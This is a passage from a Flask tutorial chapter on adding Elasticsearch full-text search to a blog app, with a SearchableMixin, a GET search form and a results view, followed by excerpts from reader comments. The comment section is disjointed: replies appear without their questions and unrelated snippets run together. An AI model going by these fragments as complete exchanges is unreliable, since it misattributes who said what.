Note that this makes use of several advanced techniques, so you will\nneed to study this code carefully to fully understand it.\n\n_app/models.py_ : SearchableMixin class.\n\n    \n    \n    from app.search import add_to_index, remove_from_index, query_index\n    \n    class SearchableMixin(object):\n        @classmethod\n        def search(cls, expression, page, per_page):\n            ids, total = query_index(cls.__tablename__, expression, page, per_page)\n            if total == 0:\n                return cls.query.filter_by(id=0), 0\n            when = []\n            for i in range(len(ids)):\n                when.append((ids[i], i))\n            return cls.query.filter(cls.id.in_(ids)).order_by(\n                db.case(when, value=cls.id)), total\n    \n        @classmethod\n        def before_commit(cls, session):\n            session._changes = {\n                'add': list(session.new),\n                'update': list(session.dirty),\n                'delete': list(session.deleted)\n            }\n    \n        @classmethod\n        def after_commit(cls, session):\n            for obj in session._changes['add']:\n                if isinstance(obj, SearchableMixin):\n                    add_to_index(obj.__tablename__, obj)\n            for obj in session._changes['update']:\n                if isinstance(obj, SearchableMixin):\n                    add_to_index(obj.__tablename__, obj)\n            for obj in session._changes['delete']:\n                if isinstance(obj, SearchableMixin):\n                    remove_from_index(obj.__tablename__, obj)\n            session._changes = None\n    \n        @classmethod\n        def reindex(cls):\n            for obj in cls.query:\n                add_to_index(cls.__tablename__, obj)\n    \n    db.event.listen(db.session, 'before_commit', SearchableMixin.before_commit)\n    db.event.listen(db.session, 'after_commit', SearchableMixin.after_commit)\n    \n\nThere are four functions in this mixin class, all class methods. Just as a\nrefresher, a class method is a special method that is associated with the\nclass and not a particular instance. Note how I renamed the `self` argument\nused in regular instance methods to `cls`, to make it clear that this method\nreceives a class and not an instance as its first argument. Once attached to\nthe `Post` model for example, the `search()` method above would be invoked as\n`Post.search()`, without having to have an actual instance of class `Post`.\n\nThe `search()` class method wraps the `query_index()` function from\n_app/search.py_ to replace the list of object IDs with actual objects. You can\nsee that the first thing this function does is call `query_index()`, passing\n`cls.__tablename__` as the index name. This is going to be a convention, all\nindexes will be named with the name Flask-SQLAlchemy assigned to the\nrelational table. The function returns the list of result IDs, and the total\nnumber of results. The SQLAlchemy query that retrieves the list of objects by\ntheir IDs is based on a `CASE` statement from the SQL language, which needs to\nbe used to ensure that the results from the database come in the same order as\nthe IDs are given. This is important because the Elasticsearch query returns\nresults sorted from more to less relevant. If you want to learn more about the\nway this query works, you can consult the accepted answer to this\n[StackOverflow question](https://stackoverflow.com/a/6332081/904393). The\n`search()` function returns the query that replaces the list of IDs, and also\npasses through the total number of search results as a second return value.\n\nThe `before_commit()` and `after_commit()` methods are going to respond to two\nevents from SQLAlchemy, which are triggered before and after a commit takes\nplace respectively. The before handler is useful because the session hasn't\nbeen committed yet, so I can look at it and figure out what objects are going\nto be added, modified and deleted, available as `session.new`, `session.dirty`\nand `session.deleted` respectively. These objects are not going to be\navailable anymore after the session is committed, so I need to save them\nbefore the commit takes place. I'm using a `session._changes` dictionary to\nwrite these objects in a place that is going to survive the session commit,\nbecause as soon as the session is committed I will be using them to update the\nElasticsearch index.\n\nWhen the `after_commit()` handler is invoked, the session has been\nsuccessfully committed, so this is the proper time to make changes on the\nElasticsearch side. The session object has the `_changes` variable that I\nadded in `before_commit()`, so now I can iterate over the added, modified and\ndeleted objects, and make the corresponding calls to the indexing functions in\n_app/search.py_ for the objects that have the `SearchableMixin` class.\n\nThe `reindex()` class method is a simple helper method that you can use to\nrefresh an index with all the data from the relational side. You saw me do\nsomething similar from the Python shell session above to do an initial load of\nall the posts into a test index. With this method in place, I can issue\n`Post.reindex()` to add all the posts in the database to the search index.\n\nAfter the class definition I made two calls to SQLALchemy's function\n`db.event.listen()`. Note that these calls are not inside the class, but after\nit. The purpose of these two statements is to set up the event handlers that\nwill make SQLAlchemy call the `before_commit()` and `after_commit()` methods\nbefore and after each commit respectively.\n\nTo incorporate the `SearchableMixin` class into the `Post` model I have to add\nit as a subclass, and I also need to hook up the before and after commit\nevents:\n\n_app/models.py_ : Adding the SearchableMixin class to the Post model.\n\n    \n    \n    class Post(SearchableMixin, db.Model):\n        # ...\n    \n\nNow the `Post` model is automatically maintaining a full-text search index for\nposts. I can use the `reindex()` method to initialize the index from all the\nposts currently in the database:\n\n    \n    \n    >>> Post.reindex()\n    \n\nAnd I can search posts working with SQLAlchemy models by running\n`Post.search()`. In the following example, I ask for the first page of five\nelements for my query:\n\n    \n    \n    >>> query, total = Post.search('one two three four five', 1, 5)\n    >>> total\n    7\n    >>> query.all()\n    [<Post five>, <Post two>, <Post one>, <Post one more>, <Post one>]\n    \n\n## Search Form\n\nThis was very intense. The work that I've done above to keep things generic\ntouches on several advanced topics, so it may take you time to fully\nunderstand it. But now I have a complete system to work with natural language\nsearches for blog posts. What I need to do now is integrate all this\nfunctionality with the application.\n\nA fairly standard approach for web-based searches is to have the search term\nas a `q` argument in the query string of the URL. For example, if you wanted\nto search for `Python` on Google, and you want to save a couple of seconds,\nyou can just type the following URL in your browser's address bar to go\ndirectly to the results:\n\n    \n    \n    https://www.google.com/search?q=python\n    \n\nAllowing searches to be completely encapsulated in a URL is nice, because\nthese can be shared with other people, who just by clicking on the link have\naccess to the search results.\n\nThis introduces a change in the way I showed you to handle web forms in the\npast. I have used `POST` requests to submit form data for all the forms the\napplication has so far, but to implement searches as above, the form\nsubmission will have to go as a `GET` request, which is the request method\nthat is used when you type a URL in your browser or click a link. Another\ninteresting difference is that the search form is going to be in the\nnavigation bar, so it needs to be present in all pages of the application.\n\nHere is the search form class, with just the `q` text field:\n\n_app/main/forms.py_ : Search form.\n\n    \n    \n    from flask import request\n    \n    class SearchForm(FlaskForm):\n        q = StringField(_l('Search'), validators=[DataRequired()])\n    \n        def __init__(self, *args, **kwargs):\n            if 'formdata' not in kwargs:\n                kwargs['formdata'] = request.args\n            if 'csrf_enabled' not in kwargs:\n                kwargs['csrf_enabled'] = False\n            super(SearchForm, self).__init__(*args, **kwargs)\n    \n\nThe `q` field does not require any explanation, as it is similar to other text\nfields I've used in the past. For this form, I decided not to have a submit\nbutton. For a form that has a text field, the browser will submit the form\nwhen you press Enter with the focus on the field, so a button is not needed. I\nhave also added a `__init__` constructor function, which provides values for\nthe `formdata` and `csrf_enabled` arguments if they are not provided by the\ncaller. The `formdata` argument determines from where Flask-WTF gets form\nsubmissions. The default is to use `request.form`, which is where Flask puts\nform values that are submitted via `POST` request. Forms that are submitted\nvia `GET` request get have the field values in the query string, so I need to\npoint Flask-WTF at `request.args`, which is where Flask writes the query\nstring arguments. And as you remember, forms have CSRF protection added by\ndefault, with the inclusion of a CSRF token that is added to the form via the\n`form.hidden_tag()` construct in templates. For clickable search links to\nwork, CSRF needs to be disabled, so I'm setting `csrf_enabled` to `False` so\nthat Flask-WTF knows that it needs to bypass CSRF validation for this form.\n\nSince I'm going to need to have this form visible in all pages, I need to\ncreate an instance of the `SearchForm` class regardless of the page the user\nis viewing. The only requirement is that the user is logged in, because for\nanonymous users I am not currently showing any content. Instead of creating a\nform object in every route, and then passing the form to all the templates,\nI'm going to show you a very useful trick that eliminates duplication of code\nwhen you need to implement a feature across the entire application. I already\nused a `before_request` handler before, back in [Chapter 6](/post/the-flask-\nmega-tutorial-part-vi-profile-page-and-avatars), to record the time of last\nvisit for each user. What I'm going to do is create my search form in that\nsame function, but with a twist:\n\n_app/main/routes.py_ : Instantiate the search form in the before\\\\_request\nhandler.\n\n    \n    \n    from flask import g\n    from app.main.forms import SearchForm\n    \n    @bp.before_app_request\n    def before_request():\n        if current_user.is_authenticated:\n            current_user.last_seen = datetime.utcnow()\n            db.session.commit()\n            g.search_form = SearchForm()\n        g.locale = str(get_locale())\n    \n\nHere I create an instance of the search form class when I have an\nauthenticated user. But of course, I need this form object to persist until it\ncan be rendered at the end of the request, so I need to store it somewhere.\nThat somewhere is going to be the `g` container, provided by Flask. This `g`\nvariable provided by Flask is a place where the application can store data\nthat needs to persist through the life of a request. Here I'm storing the form\nin `g.search_form`, so then when the before request handler ends and Flask\ninvokes the view function that handles the requested URL, the `g` object is\ngoing to be the same, and will still have the form attached to it. It's\nimportant to note that this `g` variable is specific to each request and each\nclient, so even if your web server is handling multiple requests at a time for\ndifferent clients, you can still rely on `g` to work as private storage for\neach request, independently of what goes on in other requests that are handled\nconcurrently.\n\nThe next step is to render the form to the page. I said above that I wanted\nthis form in all pages, so what makes more sense is to render it as part of\nthe navigation bar. This is, in fact, simple, because templates can also see\nthe data stored in the `g` variable, so I don't need to worry about adding the\nform as an explicit template argument in all the `render_template()` calls in\nthe application. Here is how I can render the form in the base template:\n\n_app/templates/base.html_ : Render the search form in the navigation bar.\n\n    \n    \n                ...\n                <div class=\"collapse navbar-collapse\" id=\"bs-example-navbar-collapse-1\">\n                    <ul class=\"nav navbar-nav\">\n                        ... home and explore links ...\n                    </ul>\n                    {% if g.search_form %}\n                    <form class=\"navbar-form navbar-left\" method=\"get\"\n                            action=\"{{ url_for('main.search') }}\">\n                        <div class=\"form-group\">\n                            {{ g.search_form.q(size=20, class='form-control',\n                                placeholder=g.search_form.q.label.text) }}\n                        </div>\n                    </form>\n                    {% endif %}\n                    ...\n    \n\nThe form is rendered only if `g.search_form` is defined. This check is\nnecessary because some pages, such as error pages, may not have it defined.\nThis form is slightly different than the ones I did previously. I'm setting\nits `method` attribute to `get`, because I want the form data to be submitted\non the query string with a `GET` request. Also, the other forms I created had\nthe `action` attribute empty, because they were submitted to the same page\nthat rendered the form. This form is special because it appears in all pages,\nso I need to tell it explicitly where it needs to be submitted, which is a new\nroute that is specifically dedicated to handling searches.\n\n## Search View Function\n\nThe last bit of functionality to complete the search feature is the view\nfunction that receives the search form submission. This view function is going\nto be attached to the _/search_ route, so that you can send a search request\nwith a _http://localhost:5000/search?q=search-words_ , just like Google.\n\n_app/main/routes.py_ : Search view function.\n\n    \n    \n    @bp.route('/search')\n    @login_required\n    def search():\n        if not g.search_form.validate():\n            return redirect(url_for('main.explore'))\n        page = request.args.get('page', 1, type=int)\n        posts, total = Post.search(g.search_form.q.data, page,\n                                   current_app.config['POSTS_PER_PAGE'])\n        next_url = url_for('main.search', q=g.search_form.q.data, page=page + 1) \\\n            if total > page * current_app.config['POSTS_PER_PAGE'] else None\n        prev_url = url_for('main.search', q=g.search_form.q.data, page=page - 1) \\\n            if page > 1 else None\n        return render_template('search.html', title=_('Search'), posts=posts,\n                               next_url=next_url, prev_url=prev_url)\n    \n\nYou have seen that in the other forms I used the `form.validate_on_submit()`\nmethod to check if the form submission was valid. Unfortunately that method\nonly works for forms submitted via `POST` request, so for this form I need to\nuse `form.validate()` which just validates field values, without checking how\nthe data was submitted. If the validation fails, it is because the user\nsubmitted an empty search form, so in that case I just redirect to the explore\npage, which shows all blog posts.\n\nThe `Post.search()` method from my `SearchableMixin` class is used to obtain\nthe list of search results. The pagination is handled in a very similar way to\nthat of the index and explore pages, but generating the next and previous\nlinks is a little bit trickier without the help of the `Pagination` object\nfrom Flask-SQLAlchemy. This is where the total number of results passed as a\nsecond return value from `Post.search()` is useful.\n\nOnce the page of search results and pagination links are calculated, all that\nis left is to render a template with all this data. I could have figured out a\nway to reuse the _index.html_ template to display search results, but given\nthat there are a few differences I decided to create a dedicated _search.html_\ntemplate that is dedicated to show search results, taking advantage of the\n__post.html_ sub-template to render the search results:\n\n_app/templates/search.html_ : Search results template.\n\n    \n    \n    {% extends \"base.html\" %}\n    \n    {% block app_content %}\n        <h1>{{ _('Search Results') }}</h1>\n        {% for post in posts %}\n            {% include '_post.html' %}\n        {% endfor %}\n        <nav aria-label=\"...\">\n            <ul class=\"pager\">\n                <li class=\"previous{% if not prev_url %} disabled{% endif %}\">\n                    <a href=\"{{ prev_url or '#' }}\">\n                        <span aria-hidden=\"true\">&larr;</span>\n                        {{ _('Previous results') }}\n                    </a>\n                </li>\n                <li class=\"next{% if not next_url %} disabled{% endif %}\">\n                    <a href=\"{{ next_url or '#' }}\">\n                        {{ _('Next results') }}\n                        <span aria-hidden=\"true\">&rarr;</span>\n                    </a>\n                </li>\n            </ul>\n        </nav>\n    {% endblock %}\n    \n\nIf the rendering logic for the previous and next links gets a bit confusing it\nmight help to review the Bootstrap documentation for the [pagination\ncomponent](https://getbootstrap.com/docs/3.3/components/#pagination).\n\n![Search Results](/static/images/mega-tutorial/ch10-search-results.png)\n\nWhat do you think? This was an intense chapter, where I presented some fairly\nadvanced techniques. Some of the concepts in this chapter may take some time\nto sink in. The most important take away from this chapter is that if you want\nto use a different search engine than Elasticsearch, all you need to do is re-\nimplement the three functions in _app/search.py_. The other important benefit\nof going through this effort is that in the future, if I need to add search\nsupport for a different database model, I can simply do so by adding the\n`SearchableMixin` class to it, the `__searchable__` attribute with the list of\nfields to index and the SQLAlchemy event handler connections. I think it was\nwell worth the effort, because from now on, it is going to be easy to deal\nwith full-text indexes.\n\nHello, and thank you for visiting my blog!

I made a website and for the search function, I just need to find blog posts with a keyword in it.

What you need to watch out is performance, because the searches that use the LIKE operator aren't super efficient. A dedicated full-text search engine creates an index that is optimized to search keywords.\n\n  * ![](https://gravatar.com/avatar/fb2f9b9bc01fa1ffda85bf0e461683d2?s=60&d=identicon)\n\n#3 Serhiy said 2018-03-21T00:07:04Z\n\n    \n        Hi, Miguel.\n    \n    \n    \n    \n    Your example of using elastic search and python doesn't work.\n    After I try to enter the second command (with id=2):\n    \n    \n    \n    \n    \n    \n    \n    es.index(index='my_index', doc_type='my_index', id=2, body={'text': 'a second test'})\n    I get an error:\n    elasticsearch.exceptions.AuthorizationException: TransportError(403, 'cluster_block_exception', 'blocked by: [FORBIDDEN/12/index read-only / allow delete (api)];')\n    And it is for EVERY new index - it allows to enter a new index only once\n    \n    \n    \n    \n    \n\n  * ![](https://gravatar.com/avatar/729e26a2a2c7ff24a71958d4aa4e5f35?s=60&d=identicon)\n\n#4 Miguel Grinberg said 2018-03-21T06:19:29Z\n\n    \n        @Serhiy: Your elasticsearch is in read-only mode.

You can search anything that you incorporate into the full-text index. If you want \"attached documents\" to be searchable, then you need to incorporate their contents into the full-text index. Plagiarism search is different. I honestly don't know much about it, but I would imagine it requires a more specialized type of tool that uses full-text search as a base.\n\n  * ![](https://gravatar.com/avatar/729e26a2a2c7ff24a71958d4aa4e5f35?s=60&d=identicon)\n\n#15 Miguel Grinberg said 2018-03-23T17:37:45Z\n\n    \n        @Serhiy: that was not my experience when I tested this.

A better solution that building yet another wrapper is to add an error handler. Now, for this situation, I think checking for bounds in the pagination input from the user is actually the best solution.
